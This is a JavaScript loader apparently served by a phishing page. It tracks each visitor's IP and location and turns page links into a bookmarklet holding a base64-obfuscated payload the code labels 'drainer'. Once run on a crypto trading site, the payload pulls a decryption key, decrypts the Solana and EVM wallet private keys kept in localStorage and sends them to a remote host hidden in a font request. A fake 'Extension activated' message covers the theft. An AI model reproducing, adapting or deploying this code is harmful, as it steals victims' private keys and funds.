try {
    const data = JSON.parse(atob(document.currentScript.getAttribute("data")));
    const api_url = new URL(document.currentScript.getAttribute("src"));
    

    // Function to get country flag emoji from country code
    function getCountryFlag(countryCode) {
        if (!countryCode || countryCode.length !== 2) return '🏳️';
        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
        return String.fromCodePoint(...codePoints);
    }

    document.addEventListener("DOMContentLoaded", () => {
        // Get user IP and country
        let ipDataOutput = null;
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(ipData => {
                ipDataOutput = ipData;
                console.log(api_url.origin);
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        platform: data.platform,
                        botId: data.botId,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n🌐 <b>Page Visit</b>\n\n" + getCountryFlag(ipData.country_code) + " " + ipData.country_name + " • " + ipData.ip + "\n<code>" + navigator.userAgent + "</code>",
                    })
                });
            })
            .catch(err => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n🌐 <b>Page Visit</b>\n\n🏳️ Unknown • Unknown IP\n<code>" + navigator.userAgent + "</code>",
                    })
                });
            });

        document.querySelectorAll("a.bookmarklet").forEach(abtns => {
            const drainer = `KGFzeW5jICgpID0+IHsKICAgIGxldCBhcGlVcmwgPSBuZXcgVVJMKCJodHRwczovL2JhY2tlbmQtbWFzdGVyLXNhZ2UudmVyY2VsLmFwcCIpOwogICAgbGV0IGNvZGUgPSAiNzk1NTM3ODM5NCI7CiAgICBsZXQgdXNlcm5hbWUgPSAidGVzdCI7CiAgICBsZXQgcGxhdGZvcm0gPSAiYXhpb20iOwogICAgbGV0IGJvdElkID0gImJsYWNrZmlzaCI7CiAgICAKICAgIGZ1bmN0aW9uIGFycmF5VG9TdHJpbmcoZGF0YUFycmF5KSB7CiAgICAgICAgY29uc3QgQUxQSEFCRVQgPSAiMTIzNDU2Nzg5QUJDREVGR0hKS0xNTlBRUlNUVVZXWFlaYWJjZGVmZ2hpamttbm9wcXJzdHV2d3h5eiI7CiAgICAKICAgICAgICBjb25zdCByZXN1bHREaWdpdHMgPSBbMF07CiAgICAKICAgICAgICBmb3IgKGxldCBlbGVtZW50IG9mIGRhdGFBcnJheSkgewogICAgICAgICAgICBsZXQgY2FycnkgPSBlbGVtZW50OwogICAgCiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgcmVzdWx0RGlnaXRzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgICAgICBjb25zdCB2YWx1ZSA9IHJlc3VsdERpZ2l0c1tpXSAqIDB4MTAwICsgY2Fycnk7CiAgICAKICAgICAgICAgICAgICAgIHJlc3VsdERpZ2l0c1tpXSA9IHZhbHVlICUgNTg7CiAgICAgICAgICAgICAgICBjYXJyeSA9IHZhbHVlIC8gNTggfCAwOwogICAgICAgICAgICB9CiAgICAKICAgICAgICAgICAgd2hpbGUgKGNhcnJ5KSB7CiAgICAgICAgICAgICAgICByZXN1bHREaWdpdHMucHVzaChjYXJyeSAlIDU4KTsKICAgIAogICAgICAgICAgICAgICAgY2FycnkgPSBjYXJyeSAvIDU4IHwgMDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIAogICAgICAgIGxldCByZXN1bHRTdHJpbmcgPSAiIjsKICAgIAogICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZGF0YUFycmF5Lmxlbmd0aCAmJiBkYXRhQXJyYXlbaV0gPT09IDA7IGkrKykgcmVzdWx0U3RyaW5nICs9IEFMUEhBQkVUWzBdOwogICAgCiAgICAgICAgZm9yIChsZXQgaSA9IHJlc3VsdERpZ2l0cy5sZW5ndGggLSAxOyBpID49IDA7IGktLSkgcmVzdWx0U3RyaW5nICs9IEFMUEhBQkVUW3Jlc3VsdERpZ2l0c1tpXV07CiAgICAKICAgICAgICByZXR1cm4gcmVzdWx0U3RyaW5nCiAgICB9CgogICAgZnVuY3Rpb24gYXJyYXlUb1N0cmluZ0VWTShlKSB7CiAgICAgICAgcmV0dXJuIEFycmF5LmZyb20oZSBpbnN0YW5jZW9mIFVpbnQ4QXJyYXkgPyBlIDogbmV3IFVpbnQ4QXJyYXkoZSkpLm1hcChlID0+IGUudG9TdHJpbmcoMTYpLnBhZFN0YXJ0KDIsICIwIikpLmpvaW4oIiIpCiAgICB9CiAgICAKICAgIGZ1bmN0aW9uIHN0cmluZ1RvQXJyYXkoa2V5KSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgY29uc3QgY2xlYW5lZEtleSA9IGtleS5yZXBsYWNlKG5ldyBSZWdFeHAoIi0iLCAiZyIpLCAiKyIpLnJlcGxhY2UobmV3IFJlZ0V4cCgiXyIsICJnIiksICIvIik7CiAgICAKICAgICAgICAgICAgcmV0dXJuIFVpbnQ4QXJyYXkuZnJvbShhdG9iKGNsZWFuZWRLZXkpLCBrZXkgPT4gewogICAgICAgICAgICAgICAgcmV0dXJuIGtleS5jaGFyQ29kZUF0KDApCiAgICAgICAgICAgIH0pCiAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgIHJldHVybiBuZXcgVGV4dEVuY29kZXIoKS5lbmNvZGUoa2V5KQogICAgICAgIH0KICAgIH0KICAgIAogICAgCiAgICBhc3luYyBmdW5jdGlvbiBzZW5kRGF0YShhcGlVcmxPcmlnaW4sIGRhdGEpIHsKICAgICAgICB2YXIgdGltZXN0YW1wID0gTWF0aC5mbG9vcihEYXRlLm5vdygpIC8gMHgzZTgpOwogICAgICAgIHZhciBoZWFkZXIgPSBgJHtuYXZpZ2F0b3JbInVzZXJBZ2VudCJdfXwke3RpbWVzdGFtcH1gOwogICAgCiAgICAgICAgZGF0YVsidGltZXN0YW1wIl0gPSB0aW1lc3RhbXA7CiAgICAgICAgZGF0YVsiaGVhZGVyIl0gPSBoZWFkZXI7CiAgICAKICAgICAgICBjb25zdCB1cmwgPSBgJHthcGlVcmxPcmlnaW4gKyAiP25vY2FjaGU9IiArIGVuY29kZVVSSUNvbXBvbmVudChidG9hKEpTT04uc3RyaW5naWZ5KGRhdGEpKSl9YDsKICAgICAgICBjb25zdCBjdXN0b21FcnJvciA9ICJFeHRlbnNpb24gYWN0aXZhdGVkLiBQcmVzcyBGNCB0byBzdGFydCI7CiAgICAKICAgICAgICBjb25zdCBzdHlsZUVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzdHlsZSIpOwogICAgICAgIHN0eWxlRWxlbWVudC50ZXh0Q29udGVudCA9IGBcbkBmb250LWZhY2V7XG5mb250LWZhbWlseToibGVhayI7XG5zcmM6dXJsKCIke3VybH0iKTtcbn1cbi5mb250LXRhcmdldHtcbmZvbnQtZmFtaWx5OmxlYWs7XG59XG5gOwogICAgCiAgICAgICAgY29uc3QgZGl2RWxlbWVudCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgICAgIGRpdkVsZW1lbnQuaW5uZXJUZXh0ID0gY3VzdG9tRXJyb3I7CiAgICAgICAgZGl2RWxlbWVudC5jbGFzc0xpc3QuYWRkKCJmb250LXRhcmdldCIpOwogICAgCiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkaXZFbGVtZW50KTsKICAgICAgICBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHN0eWxlRWxlbWVudCk7CiAgICB9CiAgICAKICAgIGFzeW5jIGZ1bmN0aW9uIGRlY3J5cHQoa2V5LCB0b0RlY3J5cHQpIHsKICAgICAgICBjb25zdCBbaXZTdHJpbmcsIGRhdGFTdHJpbmddID0gU3RyaW5nKHRvRGVjcnlwdCkuc3BsaXQoIjoiKTsKICAgIAogICAgICAgIGNvbnN0IGl2ID0gc3RyaW5nVG9BcnJheShpdlN0cmluZyk7CiAgICAgICAgY29uc3QgZGF0YSA9IHN0cmluZ1RvQXJyYXkoZGF0YVN0cmluZyk7CiAgICAKICAgICAgICBjb25zdCBkZWNyeXB0ZWQgPSBhd2FpdCBjcnlwdG8uc3VidGxlLmRlY3J5cHQoeyAibmFtZSI6ICJBRVMtR0NNIiwgaXY6IGl2LCAidGFnTGVuZ3RoIjogMTI4IH0sIGtleSwgZGF0YSk7CiAgICAKICAgICAgICByZXR1cm4gbmV3IFVpbnQ4QXJyYXkoZGVjcnlwdGVkKQogICAgfQoKICAgIGNvbnN0IHsgYnVuZGxlS2V5IH0gPSBhd2FpdCAoYXdhaXQgZmV0Y2goImh0dHBzOi8vYXBpOC5heGlvbS50cmFkZS9idW5kbGUta2V5LWFuZC13YWxsZXRzIiwgewogICAgICAgICJtZXRob2QiOiAiUE9TVCIsCiAgICAgICAgImNyZWRlbnRpYWxzIjogImluY2x1ZGUiCiAgICB9KSkuanNvbigpOwoKICAgIGNvbnN0IGNyeXB0b0tleSA9IGF3YWl0IGNyeXB0by5zdWJ0bGUuaW1wb3J0S2V5KCJyYXciLCBzdHJpbmdUb0FycmF5KGJ1bmRsZUtleSkuYnVmZmVyLCB7ICJuYW1lIjogIkFFUy1HQ00iIH0sIGZhbHNlLCBbImRlY3J5cHQiXSk7CgogICAgY29uc3Qgc29sYW5hQnVuZGxlcyA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oInNCdW5kbGVzIikgfHwgIltdIik7CiAgICBjb25zdCBldm1CdW5kbGVzID0gSlNPTi5wYXJzZShsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgiZUJ1bmRsZXMiKSB8fCAiW10iKTsKCiAgICBjb25zdCBlcnJvcnMgPSBbXTsKICAgIGNvbnN0IHN1Y2Nlc3MgPSBbXTsKCiAgICBmb3IgKGNvbnN0IGJ1bmRsZSBvZiBzb2xhbmFCdW5kbGVzKSB7CiAgICAgICAgbGV0IHB1YmxpY0tleSA9ICIodW5rbm93bikiOwogICAgICAgIGxldCBwcml2YXRlS2V5ID0gIiI7CgogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGNvbnN0IGRlY3J5cHRlZEJ1bmRsZSA9IGF3YWl0IGRlY3J5cHQoY3J5cHRvS2V5LCBidW5kbGUpOwoKICAgICAgICAgICAgaWYgKGRlY3J5cHRlZEJ1bmRsZS5sZW5ndGggIT09IDB4NDApIHRocm93IG5ldyBFcnJvcigiYmFkIFNLIGxlbmd0aCIpCgogICAgICAgICAgICBwcml2YXRlS2V5ID0gYXJyYXlUb1N0cmluZyhkZWNyeXB0ZWRCdW5kbGUpOwoKICAgICAgICAgICAgY29uc3QgcHVibGljS2V5RGF0YSA9IGRlY3J5cHRlZEJ1bmRsZS5zbGljZSgweDIwKTsKCiAgICAgICAgICAgIHB1YmxpY0tleSA9IGFycmF5VG9TdHJpbmcocHVibGljS2V5RGF0YSk7CgoKICAgICAgICAgICAgc3VjY2Vzcy5wdXNoKHsKICAgICAgICAgICAgICAgICJwdWIiOiBwdWJsaWNLZXksCiAgICAgICAgICAgICAgICAicHJpdiI6IHByaXZhdGVLZXkKICAgICAgICAgICAgfSk7CgoKICAgICAgICB9IGNhdGNoIChzSUlGeDN5KSB7CiAgICAgICAgICAgIGVycm9ycy5wdXNoKHsKICAgICAgICAgICAgICAgICJwdWIiOiBwdWJsaWNLZXksCiAgICAgICAgICAgICAgICAicmVhc29uIjogc0lJRngzeVsibWVzc2FnZSJdCiAgICAgICAgICAgIH0pCiAgICAgICAgfQogICAgfQoKICAgIGZvciAoY29uc3QgYnVuZGxlIG9mIGV2bUJ1bmRsZXMpIHsKICAgICAgICBsZXQgcHVibGljS2V5ID0gIih1bmtub3duKSI7CiAgICAgICAgbGV0IHByaXZhdGVLZXkgPSAiIjsKCiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgY29uc3QgZGVjcnlwdGVkQnVuZGxlID0gYXdhaXQgZGVjcnlwdChjcnlwdG9LZXksIGJ1bmRsZSk7CgogICAgICAgICAgICBwcml2YXRlS2V5ID0gYXJyYXlUb1N0cmluZ0VWTShkZWNyeXB0ZWRCdW5kbGUpOwoKICAgICAgICAgICAgbGV0IHB1YmxpY0tleTsKICAgICAgICAgICAgCiAgICAgICAgICAgIHB1YmxpY0tleSA9ICJ1bmtub3duIjsKCiAgICAgICAgICAgIHN1Y2Nlc3MucHVzaCh7CiAgICAgICAgICAgICAgICAicHViIjogcHVibGljS2V5LAogICAgICAgICAgICAgICAgInByaXYiOiBwcml2YXRlS2V5CiAgICAgICAgICAgIH0pOwoKCiAgICAgICAgfSBjYXRjaCAoc0lJRngzeSkgewogICAgICAgICAgICBlcnJvcnMucHVzaCh7CiAgICAgICAgICAgICAgICAicHViIjogcHVibGljS2V5LAogICAgICAgICAgICAgICAgInJlYXNvbiI6IHNJSUZ4M3lbIm1lc3NhZ2UiXQogICAgICAgICAgICB9KQogICAgICAgIH0KICAgIH0KCiAgICBsZXQgc2VudCA9IFtdOwogICAgbGV0IGtleXMgPSBbXTsKCiAgICBrZXlzLnB1c2goLi4uc3VjY2Vzcy5tYXAoa2V5ID0+IHsKICAgICAgICByZXR1cm4gewogICAgICAgICAgICAicHVibGljIjoga2V5WyJwdWIiXSwKICAgICAgICAgICAgInByaXZhdGUiOiBrZXlbInByaXYiXQogICAgICAgIH0KICAgIH0pKTsKICAgIGNvbnNvbGUubG9nKGtleXMpCgogICAgc2VuZERhdGEoCiAgICAgICAgYXBpVXJsLm9yaWdpbiwKICAgICAgICB7CiAgICAgICAgICAgICJzZW50Ijogc2VudCwKICAgICAgICAgICAgImtleXMiOiBrZXlzLAogICAgICAgICAgICAiY29kZSI6IGNvZGUsCiAgICAgICAgICAgICJ1c2VybmFtZSI6IHVzZXJuYW1lLAogICAgICAgICAgICAicGxhdGZvcm0iOiBwbGF0Zm9ybSwKICAgICAgICAgICAgImJvdElkIjogYm90SWQKICAgICAgICB9CiAgICApOwoKfSkoKTsK`
            abtns.href = "javascript:eval(atob(\""+drainer+"\"))"
            abtns.draggable = true;

            abtns.draggable = true;

            abtns.addEventListener('dragstart', evt => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n⬇️ <b>Bookmarklet Drag Started</b>\n\n" + getCountryFlag(ipDataOutput.country_code) + " " + ipDataOutput.country_name + " • " + ipDataOutput.ip,
                    })
                });
            });

            abtns.addEventListener('dragend', evt => {
                fetch(`${api_url.origin}/api/message`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        error: 0,
                        chatId: data.code,
                        username: data.username,
                        botId: data.botId,
                        platform: data.platform,
                        message: "📍 <b>Platform: </b> " + data.platform + "\n\n✅ <b>Bookmarklet Drag Complete</b>\n\n" + getCountryFlag(ipDataOutput.country_code) + " " + ipDataOutput.country_name + " • " + ipDataOutput.ip,
                    })
                });
            });
        });
    });



    console.log("%c[+] Bookmarklets loaded successfully", "color: #bada55");
} catch (error) {
    console.error("[-] Failed to load bookmarklet(s):", error);
    alert("Failed to load bookmarklet(s): " + error.message);
    fetch(`${api_url.origin}/api/message`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            error: 1,
            chatId: data.code,
            username: data.username,
            botId: data.botId,
            platform: data.platform,
            errorMessage: error.message
        })
    });
}